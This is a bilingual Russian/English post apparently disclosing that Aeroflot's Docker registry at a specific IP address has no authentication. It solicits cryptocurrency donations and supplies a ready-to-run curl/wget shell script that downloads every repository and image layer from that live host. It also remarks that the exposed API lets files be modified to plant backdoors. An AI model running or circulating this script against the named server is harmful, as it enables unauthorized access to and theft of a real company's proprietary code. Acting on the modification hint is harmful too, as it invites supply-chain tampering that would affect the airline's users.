# Халатность авиакомпании "Аэрофлота" в защите данных.

На просторах интернета возможно найти много интересных данных, которые никак не защищаются в силу неграмотности или беспечности. Таким поведением страдают даже крупные корпорации. Одна из таких - авиакомпания "Аэрофлот". 
Компания хранит исходные коды всех своих веб-приложений в публичном доступе без какой либо аутентификации и шифрования. 

Для хранения исходников используется HTTP Docker. API докера доступно по адресу "http://89.208.149.202:5000/v2/".

Для получения списка всех репозитариев достаточно выполнить запрос "http://89.208.149.202:5000/v2/_catalog". 

Все репозитария никак не защищены и аутентификация отсутствует.

Получается годами весь исходный код всех внешних приложений авиакомпании "Аэрофлот" доступен публично и любой злоумышленник может их легко заполучить. Поэтому не удивительно, что данную корпорацию часто атакуют и что закономерно - удачно.
Через API так же возможно модифицировать файлы, что позволит внедрить свои закладки. Представляете масштаб проблемы, если этого не заметят программисты?

Возможно после этой публикации корпорация обратит внимание на свои проблемы и займется обеспечением информационной безопасности.

Так как поиск таких данных занимает много времени и ресурсов, поэтому прошу помочь в благотворительности. Полученные средства будут направлены на поиск других серьезных проблем в работе крупных корпораций из-за которых в первую очередь страдают пользователи услуг от этих самых корпораций.

Кто готов сделать пожертвонание прошу переводить средства на адрес bitcoin - `3HGaNTw5dfmGXHQuLsmTp9siKFqCLJSknk` или на адрес ethereum `0xF06c5bea2ad2041A7610533cE3145AEe9CBA7DDb`

Так же предоставлю скрипт, которым можно выгрузить все данные:

```
for catalog in `curl "http://89.208.149.202:5000/v2/_catalog" -s -k|jq '.repositories'|awk -F "\"" {'print $2'}`; do

    mkdir /path/to/dir/`echo $catalog`/

    # Get list versions
    for revision in `curl -s -k http://89.208.149.202:5000/v2/$catalog/tags/list|jq '.tags[]'|awk -F "\"" {'print $2'}`; do

	mkdir /path/to/dir/`echo $catalog`/`echo $revision`/

	#Get lists blob for download file
	for blob in `curl -s -vv -k http://89.208.149.202:5000/v2/$catalog/manifests/$revision|jq '.fsLayers[] .blobSum'|awk -F "\"" {'print $2'}|sort|uniq`; do

	    wget "http://89.208.149.202:5000/v2/$catalog/blobs/$blob" -O /path/to/dir/$catalog/$revision/`echo $blob|awk -F ":" {'print $2'}`.tar.gz

	done
    
    done

done
```

# Negligence of the airline "Aeroflot" in the protection of data.

On the Internet, it is possible to find many interesting data that are not protected in any way due to illiteracy or carelessness. Even large corporations suffer from this behavior. One of these is the Aeroflot airline. The company stores the source codes of all its web applications in public access without any authentication or encryption. H

TTP Docker is used to store the sources. The docker is available at "http://89.208.149.202:5000/v2/".

To get a list of all the repositories, it is enough to execute the query "http://89.208.149.202:5000/v2/_catalog". 

All repositories are not protected in any way and there is no authentication.

It turns out for years that the source code of all Aeroflot external applications is publicly available and any attacker can easily get them. Therefore, it is not surprising that this corporation is often attacked and that it is natural - successfully.
Through the API, it is also possible to modify the files, which will allow you to implement your bookmarks. Can you imagine the scale of the problem if programmers do not notice it?

Perhaps after this publication, the corporation will pay attention to its problems and will take care of ensuring information security.

Since the search for such data takes a lot of time and resources, so I ask you to help in charity. The funds received will be directed to the search for other serious problems in the work of huge corporations because of which the users of services from these same corporations primarily suffer.

Who is ready to make a donation please transfer money to the address bitcoin - `3HGaNTw5dfmGXHQuLsmTp9siKFqCLJSknk` or to the address ethereum `0xF06c5bea2ad2041A7610533cE3145AEe9CBA7DDb`

I will also provide a script that can unload all the data:

```
for catalog in `curl "http://89.208.149.202:5000/v2/_catalog" -s -k|jq '.repositories'|awk -F "\"" {'print $2'}`; do

    mkdir /path/to/dir/`echo $catalog`/

    # Get list versions
    for revision in `curl -s -k http://89.208.149.202:5000/v2/$catalog/tags/list|jq '.tags[]'|awk -F "\"" {'print $2'}`; do

	mkdir /path/to/dir/`echo $catalog`/`echo $revision`/

	#Get lists blob for download file
	for blob in `curl -s -vv -k http://89.208.149.202:5000/v2/$catalog/manifests/$revision|jq '.fsLayers[] .blobSum'|awk -F "\"" {'print $2'}|sort|uniq`; do

	    wget "http://89.208.149.202:5000/v2/$catalog/blobs/$blob" -O /path/to/dir/$catalog/$revision/`echo $blob|awk -F ":" {'print $2'}`.tar.gz

	done
    
    done

done
```
